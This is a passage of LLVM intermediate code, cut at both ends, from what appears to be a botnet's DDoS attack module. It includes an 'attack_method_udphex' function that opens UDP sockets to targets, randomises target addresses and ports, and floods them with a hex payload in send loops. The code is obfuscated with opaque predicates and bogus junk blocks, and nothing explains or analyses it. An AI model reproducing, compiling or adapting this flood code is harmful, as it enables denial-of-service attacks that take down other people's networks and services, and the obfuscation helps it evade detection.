  %394 = load i32, i32* %393, align 4
  %395 = load i8*, i8** @hexPayload, align 8
  %396 = load i32, i32* %22, align 4
  %397 = sext i32 %396 to i64
  %398 = call i64 @send(i32 %394, i8* %395, i64 %397, i32 16384)
  %399 = load i32, i32* @x.39
  %400 = load i32, i32* @y.40
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %407

; <label>:407:                                    ; preds = %originalBBpart268
  %408 = load i32, i32* @x.39
  %409 = load i32, i32* @y.40
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %407
  %416 = load i32, i32* %9, align 4
  %417 = add nsw i32 %416, 1
  store i32 %417, i32* %9, align 4
  %418 = load i32, i32* @x.39
  %419 = load i32, i32* @y.40
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBBpart283, label %originalBB70alteredBB

originalBBpart283:                                ; preds = %originalBB70
  br label %339

; <label>:426:                                    ; preds = %originalBBpart264
  %427 = load i32, i32* @x.39
  %428 = load i32, i32* @y.40
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %426
  %435 = load i32, i32* @x.39
  %436 = load i32, i32* @y.40
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %322

originalBBalteredBB:                              ; preds = %originalBB, %73
  %443 = call i32 @rand_next()
  %444 = trunc i32 %443 to i16
  %445 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %446 = load i32, i32* %9, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %448, i32 0, i32 0
  %450 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %449, i32 0, i32 1
  store i16 %444, i16* %450, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %107
  %451 = call i32 @socket(i32 2, i32 2, i32 0) #7
  %452 = load i32*, i32** %11, align 8
  %453 = load i32, i32* %9, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds i32, i32* %452, i64 %454
  store i32 %451, i32* %455, align 4
  %456 = icmp eq i32 %451, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %130
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %147
  %457 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %457, align 4
  %458 = load i16, i16* %13, align 2
  %459 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %458, i16* %459, align 2
  %460 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %461 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %460, i32 0, i32 0
  store i32 0, i32* %461, align 4
  %462 = load i32*, i32** %11, align 8
  %463 = load i32, i32* %9, align 4
  %464 = sext i32 %463 to i64
  %465 = getelementptr inbounds i32, i32* %462, i64 %464
  %466 = load i32, i32* %465, align 4
  %467 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %468 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %468, %struct.sockaddr** %467, align 8
  %469 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %470 = load %struct.sockaddr*, %struct.sockaddr** %469, align 8
  %471 = call i32 @bind(i32 %466, %struct.sockaddr* %470, i32 16) #7
  %472 = icmp eq i32 %471, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %181
  %473 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %474 = load i32, i32* %9, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %473, i64 %475
  %477 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %476, i32 0, i32 2
  %478 = load i8, i8* %477, align 4
  %479 = zext i8 %478 to i32
  %480 = icmp slt i32 %479, 32
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %206
  %481 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %482 = load i32, i32* %9, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %481, i64 %483
  %485 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %484, i32 0, i32 1
  %486 = load i32, i32* %485, align 4
  %487 = call i32 @ntohl(i32 %486) #8
  %488 = call i32 @rand_next()
  %489 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %490 = load i32, i32* %9, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %489, i64 %491
  %493 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %492, i32 0, i32 2
  %494 = load i8, i8* %493, align 4
  %495 = zext i8 %494 to i32
  %_ = sub i32 %488, %495
  %gen = mul i32 %_, %495
  %_19 = shl i32 %488, %495
  %496 = lshr i32 %488, %495
  %_20 = sub i32 0, %487
  %gen21 = add i32 %_20, %496
  %_22 = shl i32 %487, %496
  %_23 = shl i32 %487, %496
  %_24 = shl i32 %487, %496
  %_25 = sub i32 %487, %496
  %gen26 = mul i32 %_25, %496
  %_27 = shl i32 %487, %496
  %_28 = shl i32 %487, %496
  %497 = add i32 %487, %496
  %498 = call i32 @htonl(i32 %497) #8
  %499 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %500 = load i32, i32* %9, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %499, i64 %501
  %503 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %502, i32 0, i32 0
  %504 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %503, i32 0, i32 2
  %505 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %504, i32 0, i32 0
  store i32 %498, i32* %505, align 4
  br label %originalBB18

originalBB33alteredBB:                            ; preds = %originalBB33, %248
  %506 = load i32*, i32** %11, align 8
  %507 = load i32, i32* %9, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds i32, i32* %506, i64 %508
  %510 = load i32, i32* %509, align 4
  %511 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %512 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %513 = load i32, i32* %9, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %512, i64 %514
  %516 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %515, i32 0, i32 0
  %517 = bitcast %struct.sockaddr_in* %516 to %struct.sockaddr*
  store %struct.sockaddr* %517, %struct.sockaddr** %511, align 8
  %518 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %519 = load %struct.sockaddr*, %struct.sockaddr** %518, align 8
  %520 = call i32 @connect(i32 %510, %struct.sockaddr* %519, i32 16)
  %521 = icmp eq i32 %520, -1
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %281
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %299
  %522 = load i32, i32* %9, align 4
  %_42 = sub i32 0, %522
  %gen43 = add i32 %_42, 1
  %_44 = sub i32 %522, 1
  %gen45 = mul i32 %_44, 1
  %_46 = sub i32 %522, 1
  %gen47 = mul i32 %_46, 1
  %_48 = sub i32 %522, 1
  %gen49 = mul i32 %_48, 1
  %_50 = shl i32 %522, 1
  %_51 = sub i32 %522, 1
  %gen52 = mul i32 %_51, 1
  %_53 = sub i32 %522, 1
  %gen54 = mul i32 %_53, 1
  %523 = add nsw i32 %522, 1
  store i32 %523, i32* %9, align 4
  br label %originalBB41

originalBB58alteredBB:                            ; preds = %originalBB58, %322
  store i32 0, i32* %9, align 4
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %339
  %524 = load i32, i32* %9, align 4
  %525 = load i8, i8* %5, align 1
  %526 = zext i8 %525 to i32
  %527 = icmp slt i32 %524, %526
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %372
  %528 = load i32*, i32** %11, align 8
  %529 = load i32, i32* %9, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds i32, i32* %528, i64 %530
  %532 = load i32, i32* %531, align 4
  %533 = load i8*, i8** %23, align 8
  %534 = load i16, i16* %14, align 2
  %535 = zext i16 %534 to i64
  %536 = call i64 @send(i32 %532, i8* %533, i64 %535, i32 16384)
  %537 = load i32*, i32** %11, align 8
  %538 = load i32, i32* %9, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds i32, i32* %537, i64 %539
  %541 = load i32, i32* %540, align 4
  %542 = load i8*, i8** @hexPayload, align 8
  %543 = load i32, i32* %22, align 4
  %544 = sext i32 %543 to i64
  %545 = call i64 @send(i32 %541, i8* %542, i64 %544, i32 16384)
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %407
  %546 = load i32, i32* %9, align 4
  %_71 = sub i32 0, %546
  %gen72 = add i32 %_71, 1
  %_73 = sub i32 0, %546
  %gen74 = add i32 %_73, 1
  %_75 = sub i32 0, %546
  %gen76 = add i32 %_75, 1
  %_77 = sub i32 0, %546
  %gen78 = add i32 %_77, 1
  %_79 = sub i32 %546, 1
  %gen80 = mul i32 %_79, 1
  %_81 = shl i32 %546, 1
  %547 = add nsw i32 %546, 1
  store i32 %547, i32* %9, align 4
  br label %originalBB70

originalBB85alteredBB:                            ; preds = %originalBB85, %426
  br label %originalBB85
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udphex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.41
  %6 = load i32, i32* @y.42
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i8**, align 8
  %19 = alloca i32*, align 8
  %20 = alloca i16, align 2
  %21 = alloca i16, align 2
  %22 = alloca i16, align 2
  %23 = alloca i8, align 1
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %30 = alloca i8*, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %31 = load i8, i8* %13, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #7
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %18, align 8
  %35 = load i8, i8* %13, align 1
  %36 = zext i8 %35 to i64
  %37 = call noalias i8* @calloc(i64 %36, i64 4) #7
  %38 = bitcast i8* %37 to i32*
  store i32* %38, i32** %19, align 8
  %39 = load i8, i8* %15, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 7, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %20, align 2
  %43 = load i8, i8* %15, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 6, i32 65535)
  %46 = trunc i32 %45 to i16
  store i16 %46, i16* %21, align 2
  %47 = load i8, i8* %15, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 0, i32 1294)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %22, align 2
  %51 = load i8, i8* %15, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 1, i32 1)
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %23, align 1
  %55 = bitcast %struct.sockaddr_in* %24 to i8*
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 16, i32 4, i1 false)
  %56 = load i16, i16* %21, align 2
  %57 = zext i16 %56 to i32
  %58 = icmp eq i32 %57, 65535
  %59 = load i32, i32* @x.41
  %60 = load i32, i32* @y.42
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %58, label %67, label %70

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = call i32 @rand_next()
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %21, align 2
  br label %73

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = load i16, i16* %21, align 2
  %72 = call zeroext i16 @htons(i16 zeroext %71) #8
  store i16 %72, i16* %21, align 2
  br label %73

; <label>:73:                                     ; preds = %70, %67
  %74 = load i32, i32* @x.41
  %75 = load i32, i32* @y.42
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %73
  store i32 0, i32* %17, align 4
  %82 = load i32, i32* @x.41
  %83 = load i32, i32* @y.42
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %90

; <label>:90:                                     ; preds = %234, %originalBBpart24
  %91 = load i32, i32* %17, align 4
  %92 = load i8, i8* %13, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp slt i32 %91, %93
  br i1 %94, label %95, label %237

; <label>:95:                                     ; preds = %90
  %96 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %97 = load i8**, i8*** %18, align 8
  %98 = load i32, i32* %17, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8*, i8** %97, i64 %99
  store i8* %96, i8** %100, align 8
  %101 = load i16, i16* %20, align 2
  %102 = zext i16 %101 to i32
  %103 = icmp eq i32 %102, 65535
  br i1 %103, label %104, label %129

; <label>:104:                                    ; preds = %95
  %105 = load i32, i32* @x.41
  %106 = load i32, i32* @y.42
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %104
  %113 = call i32 @rand_next()
  %114 = trunc i32 %113 to i16
  %115 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %116 = load i32, i32* %17, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %115, i64 %117
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %118, i32 0, i32 0
  %120 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %119, i32 0, i32 1
  store i16 %114, i16* %120, align 2
  %121 = load i32, i32* @x.41
  %122 = load i32, i32* @y.42
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %138

; <label>:129:                                    ; preds = %95
  %130 = load i16, i16* %20, align 2
  %131 = call zeroext i16 @htons(i16 zeroext %130) #8
  %132 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %133 = load i32, i32* %17, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 0
  %137 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %136, i32 0, i32 1
  store i16 %131, i16* %137, align 2
  br label %138

; <label>:138:                                    ; preds = %129, %originalBBpart28
  %139 = call i32 @socket(i32 2, i32 2, i32 17) #7
  %140 = load i32*, i32** %19, align 8
  %141 = load i32, i32* %17, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i32, i32* %140, i64 %142
  store i32 %139, i32* %143, align 4
  %144 = icmp eq i32 %139, -1
  br i1 %144, label %145, label %146

; <label>:145:                                    ; preds = %138
  ret void

; <label>:146:                                    ; preds = %138
  %147 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %147, align 4
  %148 = load i16, i16* %21, align 2
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %148, i16* %149, align 2
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %151 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %150, i32 0, i32 0
  store i32 0, i32* %151, align 4
  %152 = load i32*, i32** %19, align 8
  %153 = load i32, i32* %17, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  %156 = load i32, i32* %155, align 4
  %157 = bitcast %union.__CONST_SOCKADDR_ARG* %28 to %struct.sockaddr**
  %158 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  store %struct.sockaddr* %158, %struct.sockaddr** %157, align 8
  %159 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %28, i32 0, i32 0
  %160 = load %struct.sockaddr*, %struct.sockaddr** %159, align 8
  %161 = call i32 @bind(i32 %156, %struct.sockaddr* %160, i32 16) #7
  %162 = icmp eq i32 %161, -1
  br i1 %162, label %163, label %164

; <label>:163:                                    ; preds = %146
  br label %164

; <label>:164:                                    ; preds = %163, %146
  %165 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %166 = load i32, i32* %17, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i64 %167
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i32 0, i32 2
  %170 = load i8, i8* %169, align 4
  %171 = zext i8 %170 to i32
  %172 = icmp slt i32 %171, 32
  br i1 %172, label %173, label %199

; <label>:173:                                    ; preds = %164
  %174 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %175 = load i32, i32* %17, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i64 %176
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %177, i32 0, i32 1
  %179 = load i32, i32* %178, align 4
  %180 = call i32 @ntohl(i32 %179) #8
  %181 = call i32 @rand_next()
  %182 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %183 = load i32, i32* %17, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i32 0, i32 2
  %187 = load i8, i8* %186, align 4
  %188 = zext i8 %187 to i32
  %189 = lshr i32 %181, %188
  %190 = add i32 %180, %189
  %191 = call i32 @htonl(i32 %190) #8
  %192 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %193 = load i32, i32* %17, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i64 %194
  %196 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %195, i32 0, i32 0
  %197 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %196, i32 0, i32 2
  %198 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %197, i32 0, i32 0
  store i32 %191, i32* %198, align 4
  br label %199

; <label>:199:                                    ; preds = %173, %164
  %200 = load i32, i32* @x.41
  %201 = load i32, i32* @y.42
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %199
  %208 = load i32*, i32** %19, align 8
  %209 = load i32, i32* %17, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds i32, i32* %208, i64 %210
  %212 = load i32, i32* %211, align 4
  %213 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %214 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %215 = load i32, i32* %17, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i32 0, i32 0
  %219 = bitcast %struct.sockaddr_in* %218 to %struct.sockaddr*
  store %struct.sockaddr* %219, %struct.sockaddr** %213, align 8
  %220 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %221 = load %struct.sockaddr*, %struct.sockaddr** %220, align 8
  %222 = call i32 @connect(i32 %212, %struct.sockaddr* %221, i32 16)
  %223 = icmp eq i32 %222, -1
  %224 = load i32, i32* @x.41
  %225 = load i32, i32* @y.42
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %223, label %232, label %233

; <label>:232:                                    ; preds = %originalBBpart212
  br label %233

; <label>:233:                                    ; preds = %232, %originalBBpart212
  br label %234

; <label>:234:                                    ; preds = %233
  %235 = load i32, i32* %17, align 4
  %236 = add nsw i32 %235, 1
  store i32 %236, i32* %17, align 4
  br label %90

; <label>:237:                                    ; preds = %90
  br label %238

; <label>:238:                                    ; preds = %298, %237
  store i32 0, i32* %17, align 4
  br label %239

; <label>:239:                                    ; preds = %originalBBpart225, %238
  %240 = load i32, i32* @x.41
  %241 = load i32, i32* @y.42
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %239
  %248 = load i32, i32* %17, align 4
  %249 = load i8, i8* %13, align 1
  %250 = zext i8 %249 to i32
  %251 = icmp slt i32 %248, %250
  %252 = load i32, i32* @x.41
  %253 = load i32, i32* @y.42
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %251, label %260, label %298

; <label>:260:                                    ; preds = %originalBBpart216
  %261 = load i8**, i8*** %18, align 8
  %262 = load i32, i32* %17, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds i8*, i8** %261, i64 %263
  %265 = load i8*, i8** %264, align 8
  store i8* %265, i8** %30, align 8
  %266 = load i8, i8* %23, align 1
  %267 = icmp ne i8 %266, 0
  br i1 %267, label %268, label %272

; <label>:268:                                    ; preds = %260
  %269 = load i8*, i8** %30, align 8
  %270 = load i16, i16* %22, align 2
  %271 = zext i16 %270 to i32
  call void @rand_str(i8* %269, i32 %271)
  br label %272

; <label>:272:                                    ; preds = %268, %260
  %273 = load i32*, i32** %19, align 8
  %274 = load i32, i32* %17, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds i32, i32* %273, i64 %275
  %277 = load i32, i32* %276, align 4
  %278 = call i64 @send(i32 %277, i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i32 0, i32 0), i64 1458, i32 16384)
  br label %279

; <label>:279:                                    ; preds = %272
  %280 = load i32, i32* @x.41
  %281 = load i32, i32* @y.42
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %279
  %288 = load i32, i32* %17, align 4
  %289 = add nsw i32 %288, 1
  store i32 %289, i32* %17, align 4
  %290 = load i32, i32* @x.41
  %291 = load i32, i32* @y.42
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBBpart225, label %originalBB18alteredBB

originalBBpart225:                                ; preds = %originalBB18
  br label %239

; <label>:298:                                    ; preds = %originalBBpart216
  br label %238

originalBBalteredBB:                              ; preds = %originalBB, %4
  %299 = alloca i8, align 1
  %300 = alloca %struct.attack_target*, align 8
  %301 = alloca i8, align 1
  %302 = alloca %struct.attack_option*, align 8
  %303 = alloca i32, align 4
  %304 = alloca i8**, align 8
  %305 = alloca i32*, align 8
  %306 = alloca i16, align 2
  %307 = alloca i16, align 2
  %308 = alloca i16, align 2
  %309 = alloca i8, align 1
  %310 = alloca %struct.sockaddr_in, align 4
  %311 = alloca %struct.iphdr*, align 8
  %312 = alloca %struct.udphdr*, align 8
  %313 = alloca i8*, align 8
  %314 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %315 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %316 = alloca i8*, align 8
  store i8 %0, i8* %299, align 1
  store %struct.attack_target* %1, %struct.attack_target** %300, align 8
  store i8 %2, i8* %301, align 1
  store %struct.attack_option* %3, %struct.attack_option** %302, align 8
  %317 = load i8, i8* %299, align 1
  %318 = zext i8 %317 to i64
  %319 = call noalias i8* @calloc(i64 %318, i64 8) #7
  %320 = bitcast i8* %319 to i8**
  store i8** %320, i8*** %304, align 8
  %321 = load i8, i8* %299, align 1
  %322 = zext i8 %321 to i64
  %323 = call noalias i8* @calloc(i64 %322, i64 4) #7
  %324 = bitcast i8* %323 to i32*
  store i32* %324, i32** %305, align 8
  %325 = load i8, i8* %301, align 1
  %326 = load %struct.attack_option*, %struct.attack_option** %302, align 8
  %327 = call i32 @attack_get_opt_int(i8 zeroext %325, %struct.attack_option* %326, i8 zeroext 7, i32 65535)
  %328 = trunc i32 %327 to i16
  store i16 %328, i16* %306, align 2
  %329 = load i8, i8* %301, align 1
  %330 = load %struct.attack_option*, %struct.attack_option** %302, align 8
  %331 = call i32 @attack_get_opt_int(i8 zeroext %329, %struct.attack_option* %330, i8 zeroext 6, i32 65535)
  %332 = trunc i32 %331 to i16
  store i16 %332, i16* %307, align 2
  %333 = load i8, i8* %301, align 1
  %334 = load %struct.attack_option*, %struct.attack_option** %302, align 8
  %335 = call i32 @attack_get_opt_int(i8 zeroext %333, %struct.attack_option* %334, i8 zeroext 0, i32 1294)
  %336 = trunc i32 %335 to i16
  store i16 %336, i16* %308, align 2
  %337 = load i8, i8* %301, align 1
  %338 = load %struct.attack_option*, %struct.attack_option** %302, align 8
  %339 = call i32 @attack_get_opt_int(i8 zeroext %337, %struct.attack_option* %338, i8 zeroext 1, i32 1)
